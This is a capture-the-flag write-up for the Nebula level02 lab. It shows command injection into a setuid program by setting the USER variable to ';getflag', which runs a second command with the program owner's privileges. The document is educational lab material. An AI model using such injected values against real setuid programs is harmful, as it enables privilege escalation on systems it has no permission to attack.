# Challenge
Find and exploit the vulnerability in the given program that allows the execution of an arbitrary program.

Challenge Link: https://exploit.education/nebula/level-02/

# Solution
Looking at the provided source code the program calls whatever is the buffer which it populates from the `USER` environment variable. We can confirm this by running the program without modiyfing anything.
```shell
level02@nebula:~$ echo $USER
level02
level02@nebula:~$ /home/flag02/flag02
about to call system("/bin/echo level02 is cool")
level02 is cool
```

If we take a look at the provided program, we can see it, like in past problems, has the setuid bit set.
```shell
level02@nebula:~$ ls -la /home/flag02/flag02
-rwsr-x--- 1 flag02 level02 7438 2011-11-20 21:22 /home/flag02/flag02
```

So we know we need to get this program to run the `getflag` program to solve the level. Since we control the `USER` environment variable which is passed into the system call we can do some simple command injection.
```shell
level02@nebula:~$ USER=";getflag"
level02@nebula:~$ /home/flag02/flag02
about to call system("/bin/echo ;getflag is cool")

You have succesfully executed getflag on a target acount
```

Success! We have solved level02. So what happened here?

Taking a look at the output of the `flag02` program is a good visual representation of what happened. We ended the call to `/bin/echo` with a semicolon and then provided our own program to run, `getflag`. Since the `flag02` program has the setuid bit set `getflag` ran under the flag02 user solving the level.
